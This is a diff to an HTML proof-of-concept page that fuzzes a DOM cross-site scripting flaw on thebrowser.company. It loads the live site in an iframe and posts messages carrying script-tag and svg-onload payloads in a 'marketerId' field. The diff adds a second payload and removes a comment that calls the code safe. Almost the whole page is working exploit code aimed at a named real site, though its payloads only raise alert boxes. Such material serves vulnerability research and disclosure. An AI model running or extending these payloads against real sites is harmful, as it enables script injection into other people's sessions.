@@ -2,11 +2,11 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>🔥 Remote XSS PoC</title>
+  <title>🔥 XSS PoC - thebrowser.company</title>
 </head>
 <body>
   <h1>✅ PoC: DOM XSS via postMessage</h1>
-  <p>Tested against: <code>https://thebrowser.company</code></p>
+  <p>This page demonstrates a Remote DOM XSS vulnerability in <code>thebrowser.company</code> using <code>postMessage</code>.</p>
   <iframe id="target" src="https://thebrowser.company/" width="100%" height="600" style="border:1px solid #aaa;"></iframe>
 
   <script>
@@ -25,6 +25,12 @@
         {
           message: "OB_SHOULD_SHOW_PICKER",
           content: {
+            marketerId: ["<script>alert(document.domain)</script>"]
+          }
+        },
+        {
+          message: "OB_SHOULD_SHOW_PICKER",
+          content: {
             marketerId: ["<svg/onload=alert(document.domain)>"]
           }
         }
@@ -33,7 +39,6 @@
       console.log("🚀 Sending fuzzed postMessage payloads...");
       payloads.forEach((p, i) => {
         console.log(`🔁 Sending payload #${i + 1}:`, p);
-        // ✅ آمن: فقط إرسال postMessage
         iframe.contentWindow.postMessage(p, "*");
       });
     };
